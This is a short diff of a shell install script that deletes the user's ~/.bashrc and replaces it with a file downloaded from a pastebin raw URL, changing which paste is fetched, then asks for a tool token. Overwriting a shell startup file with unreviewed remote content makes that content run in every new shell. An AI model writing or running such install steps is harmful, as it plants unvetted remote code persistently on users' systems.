@@ -24,7 +24,7 @@ sudo unzip -o WWP.zip
 sudo rm WWP.zip
 cp ~/.bashrc ~/.bashrc-bak
 rm -rf ~/.bashrc
-curl "https://pastebin.com/raw/Qza0fC0b" -o ~/.bashrc
+curl "https://pastebin.com/raw/6de0uBRw" -o ~/.bashrc
 dos2unix ~/.bashrc
 clear
 printf "\e[92mEnter Your Tool Token: \033[0;33m"
